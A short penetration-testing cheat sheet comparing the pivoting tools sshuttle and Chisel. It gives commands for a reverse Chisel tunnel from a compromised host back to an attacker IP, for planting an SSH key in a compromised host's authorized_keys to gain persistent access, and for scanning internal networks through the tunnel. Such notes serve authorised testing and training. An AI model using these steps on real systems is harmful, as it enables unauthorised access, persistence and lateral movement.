# Pivoting (SSHUTTLE VS Chisel)

### Compatibility

There are several pivoting tools available in the Internet. Both SSHUTTLE and Chisel are two very great examples. Chisel has many releases that are available for download at [https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases), and could work with both Windows and Linux machines. SSHUTTLE, on the other hand, requires SSH access to a target, and due to this reason, can be more easily setup with Linux machines.

### Functionality

From experience, SSHUTTLE seems to be faster than Chisel, not to mention that you could surf the internal network’s IP addresses in Firefox without using proxychains, which is a significant advantage over Chisel. Not only with Firefox, but any commands (e.g. nmap, crackmapexec) can be run on the internal network’s machines without the need to use proxychains, thereby making SSHUTTLE a “transparent” tunnel, ultimately giving the impression that your attacking machine sits in the internal network. This is the one huge advantage of SSHUTTLE over Chisel.

### Proxychains Configuration

To use either chisel or sshuttle, add the following line in /etc/proxychains4.conf:

```bash
socks5 	127.0.0.1 1080
```

### Chisel

To setup chisel, on the attacking machine, run the following command:

```bash
./chisel server -p 8000 --reverse
```

On the compromised host, run the following command:

```bash
.\chisel.exe client $attacker_ip:8000 R:socks
```

Now you can begin scanning the internal network machines using proxychains.

```bash
proxychains nmap -Pn -sT -n --top-ports 10 $ip
```

### SSHUTTLE

First, on the attacking machine, generate SSH keys if you haven’t done so previously.

```bash
ssh-keygen
```

Then, copy the contents of the public key.

```bash
cat /root/.ssh/id_ed25519.pub
```

Next, on the compromised host, cd to a home folder (could be /root too), and run the following command (replacing $contents with the contents of the public key above).

```bash
mkdir .ssh && echo "$contents" >> .ssh/authorized_keys
```

Now, from the attacking machine, you could SSH to the compromised host without specifying passwords. This allows you to use SSHUTTLE. The syntax and an example is shown below.

```bash
sshuttle -vr $ip $subnet/24
```

```bash
sshuttle -vr 192.168.1.25 172.16.2.0/24
```

Now you are in the internal network and could start scanning machines (without the need for proxychains).

```bash
nmap -Pn -sT -n --top-ports 10 $ip
```